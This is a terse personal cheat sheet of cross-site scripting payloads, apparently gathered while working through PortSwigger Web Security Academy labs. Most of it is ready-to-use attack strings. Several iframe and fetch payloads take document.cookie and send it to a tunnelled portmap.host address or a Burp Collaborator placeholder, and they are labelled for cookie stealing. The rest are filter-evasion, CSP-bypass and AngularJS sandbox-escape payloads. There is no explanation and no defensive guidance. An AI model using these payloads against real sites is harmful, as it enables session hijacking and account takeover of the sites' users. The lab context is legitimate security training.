
|||||||||||||||||||||||||||||||||||||||||||||||||||||
Cheat-sheet link : https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onafterscriptexecute
|||||||||||||||||||||||||||||||||||||||||||||||||||||
<iframe src="javascript:var i=' ' + document.cookie; alert(i); fetch('http://pip3lee101-64604.portmap.host:64604/?sam')">


for cookia stelling
<iframe src="javascript:let i=new Image;i.src='http://pip3lee101-64604.portmap.host:64604/?lee101='+document.cookie; console.log(document.cookie);" >

<iframe src="javascript:console.log(document.cookie); location='http://pip3lee101-64604.portmap.host:64604/?lee101='+document.cookie;" >

<iframe src="javascript:fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'GET',
mode: 'no-cors',
body:document.cookie
}); console.log(document.cookie);" >


<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

for cookie stelling HREF
javascript:fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});


|||||||||||||||||||||||||||||||||||||||||||||||||||||
HTML HTML HTML entities test ===>
&#x6c;&#x65;&#x65;&#x31;&#x30;&#x31;
|||||||||||||||||||||||||||||||||||||||||||||


for seperate html page
<iframe src="https://0a97007b03b5c853c0631f0600af003c.web-security-academy.net/" onload="this.src+='<img src=x onerror=print()>'"></iframe>


for anchor HREF inputs this payload to store <a src="javascript:alert(1)">LIKE website</a> ++++===>
javascript:alert(1)
http://foo?&apos;-alert(1)-&apos;


||||||||||||||||||||||||||||||||||||||||||||||||||||||
for testing =====>
<iframe src="javascript:alert('xss');" >
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
"><svg onload=alert(document.cookie);>
<svg onload=alert(document.cookie);>
"onmouseover="alert('xss')
'-alert(1)-'
{{$on.constructor('alert(1)')()}}
\"-alert(1)}//
\'-alert(1)//
${alert(1)}
<><img src=1 onerror=alert(1)>
</script><script>alert(1)</script>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>


||||||||||||||||||||||||||||||||||||||||||||||||||||||
special url and id payloads =========>
"></select><img%20src=1%20onerror=alert(1)>
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
/?'accesskey='x'onclick='alert(1)
"><svg><animatetransform onbegin=alert(1)>
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';